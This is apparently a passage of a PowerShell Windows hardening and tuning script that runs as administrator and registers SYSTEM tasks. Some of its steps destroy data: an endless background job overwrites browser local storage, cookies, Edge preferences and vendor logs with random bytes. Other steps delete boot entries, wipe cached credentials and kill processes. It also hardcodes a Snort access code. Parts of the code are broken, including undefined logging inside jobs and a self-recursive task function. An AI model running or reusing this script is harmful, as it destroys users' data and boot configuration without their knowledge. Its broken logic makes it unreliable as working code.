
#Requires -RunAsAdministrator
# GSecurity.ps1
# Consolidated Windows security and optimization script
# Author: Gorstak, optimized by Grok
# Description: Comprehensive script for securing and optimizing Windows systems, including web server and VM termination

param (
    [switch]$Monitor,
    [switch]$Backup,
    [switch]$ResetPassword,
    [switch]$Start,
    [string]$SnortOinkcode = "6cc50dfad45e71e9d8af44485f59af2144ad9a3c",
    [switch]$DebugMode,
    [switch]$NoMonitor,
    [string]$ConfigPath = "$env:USERPROFILE\GSecurity_config.json"
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$Global:ExitCode = 0
$Global:LogDir = "$env:TEMP\security_rules\logs"
$Global:LogFile = "$Global:LogDir\SecureWindows_$(Get-Date -Format 'yyyyMMdd').log"

# Configuration
$Global:Config = @{
    CookieMonitor = @{
        TaskScriptPath = "C:\Windows\Setup\Scripts\Bin\CookieMonitor.ps1"
        LogDir = "C:\logs"
        BackupDir = "$env:ProgramData\CookieBackup"
        CookieLogPath = "$env:ProgramData\CookieBackup\CookieMonitor.log"
        PasswordLogPath = "$env:ProgramData\CookieBackup\NewPassword.log"
        ErrorLogPath = "$env:ProgramData\CookieBackup\ScriptErrors.log"
        CookiePath = "$env:LocalAppData\Google\Chrome\User Data\Default\Cookies"
        BackupPath = "$env:ProgramData\CookieBackup\Cookies.bak"
    }
    Sources = @{
        YaraForge = "https://github.com/YARAHQ/yara-forge/releases"
        YaraRules = "https://github.com/Yara-Rules/rules/archive/refs/heads/master.zip"
        SigmaHQ = "https://github.com/SigmaHQ/sigma/archive/refs/heads/master.zip"
        EmergingThreats = "https://rules.emergingthreats.net/open/snort-3.0.0/emerging.rules.tar.gz"
        SnortCommunity = "https://www.snort.org/downloads/community/community-rules.tar.gz"
    }
    ExcludedSystemFiles = @(
        "svchost.exe", "lsass.exe", "cmd.exe", "explorer.exe", "winlogon.exe",
        "csrss.exe", "services.exe", "msiexec.exe", "conhost.exe", "dllhost.exe",
        "WmiPrvSE.exe", "MsMpEng.exe", "TrustedInstaller.exe", "spoolsv.exe", "LogonUI.exe"
    )
    Telemetry = @{
        Enabled = $true
        MaxEvents = 1000
        Path = "$env:TEMP\security_rules\telemetry.json"
    }
    RetrySettings = @{
        MaxRetries = 3
        RetryDelaySeconds = 5
    }
}

# Logging Function
function Write-Log {
    param (
        [string]$Message,
        [string]$EntryType = "Information"
    )
    $maxEventLogLength = 32766
    if (-not (Test-Path $Global:LogDir)) {
        New-Item -ItemType Directory -Path $Global:LogDir -Force | Out-Null
    }
    
    $truncatedMessage = if ($Message.Length -gt $maxEventLogLength) {
        $Message.Substring(0, $maxEventLogLength - 100) + "... [Truncated, see log file]"
    } else {
        $Message
    }
    
    $color = switch ($EntryType) {
        "Error" { "Red" }
        "Warning" { "Yellow" }
        default { "White" }
    }
    Write-Host "[$EntryType] $truncatedMessage" -ForegroundColor $color
    
    $logEntry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$EntryType] $Message"
    $logEntry | Out-File -FilePath $Global:LogFile -Append -Encoding UTF8
    
    try {
        Write-EventLog -LogName "Application" -Source "GSecurity" -EventId 1000 -EntryType $EntryType -Message $truncatedMessage -ErrorAction Stop
    } catch {
        $errorMsg = "Failed to write to Event Log: $_"
        $errorMsg | Out-File -FilePath $Global:LogFile -Append -Encoding UTF8
    }
}

# Exit Handler
function Exit-Script {
    param (
        [int]$ExitCode = 0,
        [string]$Message = ""
    )
    if ($Message) {
        Write-Log $Message -EntryType $(if ($ExitCode -ne 0) { "Error" } else { "Information" })
    }
    exit $ExitCode
}

# Initialize Event Log
function Initialize-EventLog {
    if (-not [System.Diagnostics.EventLog]::SourceExists("GSecurity")) {
        New-EventLog -LogName "Application" -Source "GSecurity"
        Write-Log "Created Event Log source: GSecurity"
    }
}

# Register Scheduled Task
function Register-ScheduledTask {
    param (
        [string]$TaskName,
        [string]$ScriptPath,
        [string]$Arguments = "",
        [switch]$AtLogon,
        [switch]$AtStartup,
        [string]$EventQuery
    )
    try {
        $targetFolder = Split-Path $ScriptPath
        if (-not (Test-Path $targetFolder)) {
            New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
            Write-Log "Created folder: $targetFolder"
        }
        
        Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force -ErrorAction Stop
        Write-Log "Copied script to: $ScriptPath"
        
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`" $Arguments"
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        if ($AtLogon) {
            $trigger = New-ScheduledTaskTrigger -AtLogon
        } elseif ($AtStartup) {
            $trigger = New-ScheduledTaskTrigger -AtStartup
        } elseif ($EventQuery) {
            $taskService = New-Object -ComObject Schedule.Service
            $taskService.Connect()
            $taskDefinition = $taskService.NewTask(0)
            $trigger = $taskDefinition.Triggers.Create(0)
            $trigger.Subscription = $EventQuery
            $trigger.Enabled = $true
            $actionObj = $taskDefinition.Actions.Create(0)
            $actionObj.Path = "powershell.exe"
            $actionObj.Arguments = "-ExecutionPolicy Bypass -File `"$ScriptPath`" $Arguments"
            $taskDefinition.Settings.Enabled = $true
            $taskDefinition.Settings.AllowDemandStart = $true
            $taskDefinition.Settings.StartWhenAvailable = $true
            $taskService.GetFolder("\").RegisterTaskDefinition($TaskName, $taskDefinition, 6, "SYSTEM", $null, 4)
            Write-Log "Registered event-based task: $TaskName"
            return
        }
        
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -ErrorAction Stop
        Write-Log "Registered task: $TaskName"
    } catch {
        Write-Log "Failed to register task ${TaskName}: $_" -EntryType "Error"
        $Global:ExitCode = 1
    }
}

# Audio Enhancements
function Invoke-AudioEnhancements {
    function Take-RegistryOwnership {
        param ([string]$RegPath)
        try {
            $regKeyPath = "HKLM:\$RegPath"
            if (-not (Test-Path $regKeyPath)) {
                Write-Log "Registry path $RegPath does not exist" -EntryType "Warning"
                return $false
            }
            $acl = Get-Acl -Path $regKeyPath -ErrorAction Stop
            $admin = New-Object System.Security.Principal.NTAccount("Administrators")
            $acl.SetOwner($admin)
            $rule = New-Object System.Security.AccessControl.RegistryAccessRule($admin, "FullControl", "Allow")
            $acl.AddAccessRule($rule)
            Set-Acl -Path $regKeyPath -AclObject $acl -ErrorAction Stop
            Write-Log "Took ownership of $RegPath"
            return $true
        } catch {
            Write-Log "Failed to take ownership of ${RegPath}: $_" -EntryType "Error"
            return $false
        }
    }

    $renderDevicesKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render"
    try {
        $audioDevices = Get-ChildItem -Path $renderDevicesKey -ErrorAction Stop
        foreach ($device in $audioDevices) {
            $fxPropertiesKey = "$($device.PSPath)\FxProperties"
            if (-not (Test-Path $fxPropertiesKey)) {
                New-Item -Path $fxPropertiesKey -Force | Out-Null
                Write-Log "Created FxProperties key for device: $($device.PSChildName)"
            }
            if (-not (Take-RegistryOwnership -RegPath ($fxPropertiesKey -replace 'HKEY_LOCAL_MACHINE\\', ''))) {
                Write-Log "Skipping device $($device.PSChildName) due to ownership failure" -EntryType "Warning"
                continue
            }

            $aecKey = "{1c7b1faf-caa2-451b-b0a4-87b19a93556a},6"
            $noiseSuppressionKey = "{e0f158e1-cb04-43d5-b6cc-3eb27e4db2a1},3"
            $enableValue = 1

            foreach ($key in @($aecKey, $noiseSuppressionKey)) {
                $settingName = if ($key -eq $aecKey) { "Acoustic Echo Cancellation" } else { "Noise Suppression" }
                try {
                    if ((Get-ItemProperty -Path $fxPropertiesKey -Name $key -ErrorAction SilentlyContinue).$key -ne $enableValue) {
                        Set-ItemProperty -Path $fxPropertiesKey -Name $key -Value $enableValue -ErrorAction Stop
                        Write-Log "$settingName enabled for device: $($device.PSChildName)"
                    } else {
                        Write-Log "$settingName already enabled for device: $($device.PSChildName)"
                    }
                } catch {
                    Write-Log "Failed to enable $settingName for device $($device.PSChildName): $_" -EntryType "Error"
                }
            }
        }
    } catch {
        Write-Log "Error processing audio devices: $_" -EntryType "Error"
    }
}

# BCD Cleanup
function Invoke-BCDCleanup {
    $BackupPath = "C:\BCD_Backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').bcd"
    Write-Log "Creating BCD backup at $BackupPath"
    try {
        & bcdedit /export $BackupPath | Out-Null
        Write-Log "BCD backup created successfully."
    } catch {
        Write-Log "Error creating BCD backup: $_" -EntryType "Error"
        $Global:ExitCode = 1
        return
    }
    
    Write-Log "Enumerating BCD entries..."
    $BcdOutput = & bcdedit /enum all
    if (-not $BcdOutput) {
        Write-Log "Failed to enumerate BCD entries." -EntryType "Error"
        $Global:ExitCode = 1
        return
    }
    
    $BcdEntries = @()
    $currentEntry = $null
    foreach ($line in $BcdOutput) {
        if ($line -match "^identifier\s+({[0-9a-fA-F-]{36}|{[^}]+})") {
            if ($currentEntry) { $BcdEntries += $currentEntry }
            $currentEntry = [PSCustomObject]@{
                Identifier = $Matches[1]
                Properties = @{}
            }
        } elseif ($line -match "^(\w+)\s+(.+)$") {
            if ($currentEntry) { $currentEntry.Properties[$Matches[1]] = $Matches[2] }
        }
    }
    if ($currentEntry) { $BcdEntries += $currentEntry }
    
    $CriticalIds = @("{bootmgr}", "{current}", "{default}")
    $SuspiciousEntries = @()
    foreach ($entry in $BcdEntries) {
        if ($entry.Identifier -in $CriticalIds) { continue }
        $isSuspicious = $false
        $reason = ""
        
        if ($entry.Properties.description -and $entry.Properties.description -notmatch "Windows") {
            $isSuspicious = $true
            $reason += "Non-Windows description: $($entry.Properties.description); "
        }
        if ($entry.Properties.device -match "vhd=") {
            $isSuspicious = $true
            $reason += "Uses VHD device: $($entry.Properties.device); "
        }
        if ($entry.Properties.path -and $entry.Properties.path -notmatch "winload.exe") {
            $isSuspicious = $true
            $reason += "Non-standard boot path: $($entry.Properties.path); "
        }
        
        if ($isSuspicious) {
            $SuspiciousEntries += [PSCustomObject]@{
                Identifier = $entry.Identifier
                Description = $entry.Properties.description
                Device = $entry.Properties.device
                Path = $entry.Properties.path
                Reason = $reason
            }
        }
    }
    
    if ($SuspiciousEntries.Count -eq 0) {
        Write-Log "No suspicious BCD entries found."
    } else {
        foreach ($entry in $SuspiciousEntries) {
            Write-Log "Suspicious entry: $($entry.Identifier) - $($entry.Reason)"
            try {
                & bcdedit /delete $entry.Identifier /f | Out-Null
                Write-Log "Deleted entry: $($entry.Identifier)"
            } catch {
                Write-Log "Error deleting entry $($entry.Identifier): $_" -EntryType "Error"
                $Global:ExitCode = 1
            }
        }
    }
}

# Browser Security
function Invoke-BrowserSecurity {
    $desiredSettings = @{
        "media_stream" = 2
        "webrtc" = 2
        "remote" = @{ "enabled" = $false; "support" = $false }
    }
    
    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable"
    }
    
    foreach ($browser in $browsers.GetEnumerator()) {
        if (Test-Path $browser.Value) {
            $prefsPath = "$($browser.Value)\Preferences"
            if (Test-Path $prefsPath) {
                try {
                    $prefsContent = Get-Content -Path $prefsPath -Raw | ConvertFrom-Json
                    $settingsChanged = $false
                    
                    if ($prefsContent.profile -and $prefsContent.profile["default_content_setting_values"]) {
                        foreach ($key in $desiredSettings.Keys.Where({ $_ -ne "remote" })) {
                            if ($prefsContent.profile["default_content_setting_values"][$key] -ne $desiredSettings[$key]) {
                                $prefsContent.profile["default_content_setting_values"][$key] = $desiredSettings[$key]
                                $settingsChanged = $true
                            }
                        }
                    }
                    
                    if ($prefsContent.remote) {
                        foreach ($key in $desiredSettings["remote"].Keys) {
                            if ($prefsContent.remote[$key] -ne $desiredSettings["remote"][$key]) {
                                $prefsContent.remote[$key] = $desiredSettings["remote"][$key]
                                $settingsChanged = $true
                            }
                        }
                    }
                    
                    if ($settingsChanged) {
                        $prefsContent | ConvertTo-Json -Compress | Set-Content -Path $prefsPath
                        Write-Log "$($browser.Key): Updated WebRTC and remote settings."
                    }
                    
                    if ($prefsContent.plugins) {
                        foreach ($plugin in $prefsContent.plugins) {
                            $plugin.enabled = $false
                        }
                        Write-Log "$($browser.Key): Plugins disabled."
                    }
                } catch {
                    Write-Log "Error updating $($browser.Key) settings: $_" -EntryType "Error"
                }
            } else {
                Write-Log "$($browser.Key): Preferences file not found at $prefsPath."
            }
        } else {
            Write-Log "$($browser.Key): Profile path not found."
        }
    }
    
    # Firefox configuration
    $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfilePath) {
        $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
        foreach ($profile in $firefoxProfiles) {
            $prefsJsPath = "$($profile.FullName)\prefs.js"
            $pluginRegPath = "$($profile.FullName)\pluginreg.dat"
            
            if (Test-Path $prefsJsPath) {
                Copy-Item -Path $prefsJsPath -Destination "$prefsJsPath.bak" -Force
                $prefsJsContent = Get-Content -Path $prefsJsPath
                if ($prefsJsContent -notmatch 'user_pref\("media.peerconnection.enabled", false\)') {
                    Add-Content -Path $prefsJsPath 'user_pref("media.peerconnection.enabled", false);'
                    Write-Log "Firefox profile $($profile.FullName): WebRTC disabled."
                }
            }
            
            if (Test-Path $pluginRegPath) {
                Clear-Content -Path $pluginRegPath
                Write-Log "Firefox profile $($profile.FullName): Plugins disabled."
            }
        }
    }
    
    # Chrome Remote Desktop
    $serviceName = "chrome-remote-desktop-host"
    if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
        Stop-Service -Name $serviceName -Force
        Set-Service -Name $serviceName -StartupType Disabled
        Write-Log "Chrome Remote Desktop service stopped and disabled."
    }
    
    $ruleName = "Block CRD Ports"
    if (Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue) {
        Remove-NetFirewallRule -DisplayName $ruleName
    }
    New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Protocol TCP -LocalPort 443 -Action Block -Profile Any
    Write-Log "Firewall rule created to block Chrome Remote Desktop."
}

# Credential Protection
function Invoke-CredentialProtection {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -Type DWord -ErrorAction Stop
        Write-Log "LSASS configured as Protected Process Light."
    } catch {
        Write-Log "Failed to enable LSASS PPL: $_" -EntryType "Error"
    }
    
    try {
        $cmdkeyPath = "$env:SystemRoot\System32\cmdkey.exe"
        if (Test-Path $cmdkeyPath) {
            & $cmdkeyPath /list | ForEach-Object {
                if ($_ -match "Target:") {
                    $target = $_ -replace ".*Target: (.*)", '$1'
                    & $cmdkeyPath /delete:$target
                }
            }
            Write-Log "Cleared cached credentials."
        } else {
            Write-Log "cmdkey.exe not found at $cmdkeyPath. Skipping credential cleanup." -EntryType "Warning"
        }
    } catch {
        Write-Log "Failed to clear credentials: $_" -EntryType "Error"
    }
    
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -Value 0 -Type String -ErrorAction Stop
        Write-Log "Disabled credential caching."
    } catch {
        Write-Log "Failed to disable credential caching: $_" -EntryType "Error"
    }
    
    try {
        auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
        Write-Log "Enabled credential validation auditing."
    } catch {
        Write-Log "Failed to enable auditing: $_" -EntryType "Error"
    }
}

# Telemetry Corruption
function Invoke-TelemetryCorruption {
    $TargetFiles = @(
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl",
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener_1.etl",
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\ShutdownLogger.etl",
        "$env:LocalAppData\Microsoft\Windows\WebCache\WebCacheV01.dat",
        "$env:ProgramData\Microsoft\Windows\AppRepository\StateRepository-Deployment.srd",
        "$env:ProgramData\Microsoft\Diagnosis\eventTranscript\eventTranscript.db",
        "$env:LocalAppData\Google\Chrome\User Data\Default\Local Storage\leveldb\*.log",
        "$env:LocalAppData\Google\Chrome\User Data\EventLog\*.etl",
        "$env:LocalAppData\Microsoft\Edge\User Data\Default\Preferences",
        "$env:ProgramData\NVIDIA Corporation\NvTelemetry\NvTelemetryContainer.etl",
        "$env:ProgramFiles\NVIDIA Corporation\NvContainer\NvContainerTelemetry.etl",
        "$env:ProgramFiles(x86)\Google\Update\GoogleUpdate.log",
        "$env:ProgramData\Adobe\ARM\log\ARMTelemetry.etl",
        "$env:LocalAppData\Adobe\Creative Cloud\ACC\logs\CoreSync.log",
        "$env:ProgramFiles\Common Files\Adobe\OOBE\PDApp.log",
        "$env:ProgramData\Intel\Telemetry\IntelData.etl",
        "$env:ProgramFiles\Intel\Driver Store\Telemetry\IntelGFX.etl",
        "$env:ProgramData\AMD\CN\AMDDiag.etl",
        "$env:LocalAppData\AMD\CN\logs\RadeonSoftware.log",
        "$env:ProgramFiles\AMD\CNext\CNext\AMDTel.db",
        "$env:ProgramFiles(x86)\Steam\logs\perf.log",
        "$env:LocalAppData\Steam\htmlcache\Cookies",
        "$env:ProgramData\Steam\SteamAnalytics.etl",
        "$env:ProgramData\Epic\EpicGamesLauncher\Data\EOSAnalytics.etl",
        "$env:LocalAppData\EpicGamesLauncher\Saved\Logs\EpicGamesLauncher.log",
        "$env:LocalAppData\Discord\app-*\modules\discord_analytics\*.log",
        "$env:AppData\Discord\Local Storage\leveldb\*.ldb",
        "$env:LocalAppData\Autodesk\Autodesk Desktop App\Logs\AdskDesktopAnalytics.log",
        "$env:ProgramData\Autodesk\Adlm\Telemetry\AdlmTelemetry.etl",
        "$env:LocalAppData\Logitech\LogiOptions\logs\LogiAnalytics.log",
        "$env:ProgramData\Logitech\LogiSync\Telemetry.etl",
        "$env:ProgramData\Razer\Synapse3\Logs\RazerSynapse.log",
        "$env:LocalAppData\Razer\Synapse\Telemetry\RazerTelemetry.etl",
        "$env:ProgramData\Corsair\CUE\logs\iCUETelemetry.log",
        "$env:LocalAppData\Corsair\iCUE\Analytics\*.etl",
        "$env:ProgramData\Kaspersky Lab\AVP*\logs\Telemetry.etl",
        "$env:ProgramData\McAfee\Agent\logs\McTelemetry.log",
        "$env:ProgramData\Norton\Norton\Logs\NortonAnalytics.etl",
        "$env:ProgramFiles\Bitdefender\Bitdefender Security\logs\BDTelemetry.db",
        "$env:LocalAppData\Slack\logs\SlackAnalytics.log",
        "$env:ProgramData\Dropbox\client\logs\DropboxTelemetry.etl",
        "$env:LocalAppData\Zoom\logs\ZoomAnalytics.log"
    )
    
    Start-Job -ScriptBlock {
        param ($Files)
        function Overwrite-File {
            param ($FilePath)
            try {
                if (Test-Path $FilePath) {
                    $Size = (Get-Item $FilePath).Length
                    $Junk = [byte[]]::new($Size)
                    (New-Object System.Random).NextBytes($Junk)
                    [System.IO.File]::WriteAllBytes($FilePath, $Junk)
                    Write-Log "Overwrote telemetry file: $FilePath"
                }
            } catch {
                Write-Log "Error overwriting ${FilePath}: $_" -EntryType "Error"
            }
        }
        
        while ($true) {
            $StartTime = Get-Date
            foreach ($File in $Files) {
                if ($File -match '\*') {
                    Get-Item -Path $File -ErrorAction SilentlyContinue | ForEach-Object { Overwrite-File -FilePath $_.FullName }
                } else {
                    Overwrite-File -FilePath $File
                }
            }
            $ElapsedSeconds = ((Get-Date) - $StartTime).TotalSeconds
            $SleepSeconds = [math]::Max(3600 - $ElapsedSeconds, 0)
            Start-Sleep -Seconds $SleepSeconds
        }
    } -ArgumentList $TargetFiles
    Write-Log "Started telemetry corruption job."
}

# Suspicious File Removal
function Invoke-SuspiciousFileRemoval {
    Start-Job -ScriptBlock {
        while ($true) {
            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DriveType -in @('Fixed', 'Removable', 'Network') }
            foreach ($drive in $drives) {
                $files = Get-ChildItem -Path $drive.Root -Recurse -File -ErrorAction SilentlyContinue
                $processes = Get-WmiObject Win32_Process | Where-Object {
                    $processPath = $_.ExecutablePath
                    if ($processPath) { $files | Where-Object { $_.FullName -eq $processPath } }
                }
                
                foreach ($process in $processes) {
                    if ($process.Name -eq "Unknown" -or $process.Name -eq "N/A" -or $process.Name -eq "" -or ($process.ExecutablePath -and -not (Test-Path $process.ExecutablePath))) {
                        if ($process.ProcessId) {
                            Stop-Process -Id $process.ProcessId -Force -ErrorAction SilentlyContinue
                            Write-Log "Terminated suspicious process: $($process.Name)"
                        }
                    }
                }
            }
            Start-Sleep -Seconds 120
        }
    }
    Write-Log "Started suspicious file removal job."
}

# Device Filtering
function Invoke-DeviceFiltering {
    $scriptDir = Split-Path -Parent $PSCommandPath
    $setAclPath = Join-Path $scriptDir "SetACL.exe"
    
    if (-not (Test-Path $setAclPath)) {
        Write-Log "SetACL.exe not found in $scriptDir" -EntryType "Error"
        $Global:ExitCode = 1
        return
    }
    
    Write-Log "Listing all devices..."
    $devices = Get-WmiObject -Class Win32_PnPEntity | Where-Object { $_.DeviceID -ne $null } | Select-Object Name, DeviceID
    
    $consoleLogonGroup = "S-1-2-1"
    foreach ($device in $devices) {
        $deviceId = $device.DeviceID
        Write-Log "Setting permissions for device: $($device.Name) ($deviceId)"
        try {
            & $setAclPath -on $deviceId -ot reg -actn setprot -op "dacl:np" -ace "n:$consoleLogonGroup;p:full"
            & $setAclPath -on $deviceId -ot reg -actn setprot -op "dacl:np"
            & $setAclPath -on $deviceId -ot reg -actn rstchldrn -rst "dacl,sacl"
            Write-Log "Permissions updated for $deviceId"
        } catch {
            Write-Log "Error setting permissions for ${deviceId}: $_" -EntryType "Error"
        }
    }
}

# Performance Tweaks
function Invoke-PerformanceTweaks {
    function Set-RegKey {
        param ([string]$Path, [string]$Name, $Value, [string]$ValueType = "DWord")
        if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
        if ($ValueType -eq "DWord") {
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type DWord -Force -ErrorAction SilentlyContinue
        } else {
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type String -Force -ErrorAction SilentlyContinue
        }
    }
    
    try {
        bcdedit /set disabledynamictick yes | Out-Null
        bcdedit /set quietboot yes | Out-Null
        powercfg -setacvalueindex scheme_current sub_processor CPMINCORES 100 | Out-Null
        powercfg -setactive scheme_current | Out-Null
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DistributeTimers" -Value 1
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 26
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "IoPageLockLimit" -Value 0x400000
        netsh.exe interface tcp set supplemental Internet congestionprovider=ctcp | Out-Null
        netsh.exe interface tcp set global fastopen=enabled | Out-Null
        netsh.exe interface tcp set global rss=enabled | Out-Null
        Set-NetTCPSetting -SettingName * -MaxSynRetransmissions 2 -ErrorAction SilentlyContinue
        Disable-NetAdapterPowerManagement -Name * -ErrorAction SilentlyContinue
        Disable-NetAdapterLso -Name * -ErrorAction SilentlyContinue
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "Tcp1323Opts" -Value 1
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "MaxUserPort" -Value 65534
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "TcpTimedWaitDelay" -Value 30
        
        $tcpipPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"
        Get-ChildItem -Path $tcpipPath -ErrorAction SilentlyContinue | ForEach-Object {
            Set-RegKey -Path $_.PSPath -Name "TCPNoDelay" -Value 1
            Set-RegKey -Path $_.PSPath -Name "TcpAckFrequency" -Value 1
        }
        
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AFD\Parameters" -Name "DefaultReceiveWindow" -Value 33178
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AFD\Parameters" -Name "DefaultSendWindow" -Value 33178
        powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
        Set-RegKey -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "FolderContentsInfoTip" -Value 1
        Set-RegKey -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideFileExt" -Value 0
        Set-RegKey -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSecondsInSystemClock" -Value 1
        Set-RegKey -Path "HKCU:\Control Panel\Desktop" -Name "DragFullWindows" -Value "1" -ValueType "String"
        Set-RegKey -Path "HKCU:\Control Panel\Desktop" -Name "FontSmoothing" -Value "2" -ValueType "String"
        Set-RegKey -Path "HKCU:\Control Panel\Desktop" -Name "FontSmoothingType" -Value 2
        Set-RegKey -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" -Name "SystemResponsiveness" -Value 0
        Set-RegKey -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" -Name "VisualFXSetting" -Value 3
        
        $services = @("Spooler", "WSearch")
        foreach ($service in $services) {
            if ((Get-Service -Name $service -ErrorAction SilentlyContinue).StartType -ne "Disabled") {
                Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
                Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            }
        }
        
        $servicesPath = "HKLM:\SYSTEM\CurrentControlSet\Services"
        Get-ChildItem -Path $servicesPath -ErrorAction SilentlyContinue | ForEach-Object {
            Set-RegKey -Path $_.PSPath -Name "SvcHostSplitDisable" -Value 1
        }
        
        Enable-WindowsOptionalFeature -Online -FeatureName "DirectPlay" -NoRestart -ErrorAction SilentlyContinue
        $bloatFeatures = @("TFTP", "TelnetClient", "SimpleTCP")
        foreach ($feature in $bloatFeatures) {
            if ((Get-WindowsOptionalFeature -Online -FeatureName $feature -ErrorAction SilentlyContinue).State -eq 'Enabled') {
                Disable-WindowsOptionalFeature -Online -FeatureName $feature -NoRestart -ErrorAction SilentlyContinue
            }
        }
        
        $bloatCaps = @("*InternetExplorer*", "*WindowsMediaPlayer*")
        foreach ($cap in $bloatCaps) {
            $capsToRemove = Get-WindowsCapability -Online | Where-Object { $_.Name -like $cap -and $_.State -eq 'Installed' }
            foreach ($capToRemove in $capsToRemove) {
                Remove-WindowsCapability -Online -Name $capToRemove.Name -ErrorAction SilentlyContinue
            }
        }
        
        $os = Get-CimInstance -ClassName Win32_OperatingSystem
        $ram = $os.TotalVisibleMemorySize + 1024000
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control" -Name "SvcHostSplitThresholdInKB" -Value $ram
        Write-Log "Applied performance tweaks."
    } catch {
        Write-Log "Error applying performance tweaks: $_" -EntryType "Error"
    }
}

# Security Rules
function Invoke-SecurityRules {
    $tempDir = "$Global:LogDir\rules"
    if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
    $rules = @{ Yara = @(); Sigma = @(); Snort = @() }
    
    try {
        $yaraForgeDir = "$tempDir\yara_forge"
        $yaraForgeZip = "$tempDir\yara_forge.zip"
        if (-not (Test-Path $yaraForgeDir)) { New-Item -ItemType Directory -Path $yaraForgeDir -Force | Out-Null }
        $yaraForgeUri = (Invoke-WebRequest -Uri $Global:Config.Sources.YaraForge -UseBasicParsing | ConvertFrom-Json)[0].assets | Where-Object { $_.name -match "^yara-forge-.*-full\.zip$|^rules-full\.zip$" } | Select-Object -First 1
        if ($yaraForgeUri) {
            Invoke-WebRequest -Uri $yaraForgeUri.browser_download_url -OutFile $yaraForgeZip
            Expand-Archive -Path $yaraForgeZip -DestinationPath $yaraForgeDir -Force
            $rules.Yara = Get-ChildItem -Path $yaraForgeDir -Recurse -Include "*.yar", "*.yara"
            Write-Log "Downloaded $($rules.Yara.Count) YARA rules."
        }
    } catch {
        Write-Log "Failed to download YARA rules: $_" -EntryType "Warning"
    }
    
    try {
        $sigmaDir = "$tempDir\sigma"
        $sigmaZip = "$tempDir\sigma_rules.zip"
        if (-not (Test-Path $sigmaDir)) { New-Item -ItemType Directory -Path $sigmaDir -Force | Out-Null }
        Invoke-WebRequest -Uri $Global:Config.Sources.SigmaHQ -OutFile $sigmaZip
        Expand-Archive -Path $sigmaZip -DestinationPath $sigmaDir -Force
        $rules.Sigma = Get-ChildItem -Path "$sigmaDir\sigma-master\rules" -Recurse -Include "*.yml" -Exclude "*deprecated*"
        Write-Log "Downloaded $($rules.Sigma.Count) Sigma rules."
    } catch {
        Write-Log "Failed to download Sigma rules: $_" -EntryType "Warning"
    }
    
    try {
        $snortRules = "$tempDir\snort_community.rules"
        if (-not (Test-Path $snortRules)) {
            Invoke-WebRequest -Uri $Global:Config.Sources.SnortCommunity -OutFile $snortRules
            Write-Log "Downloaded Snort rules."
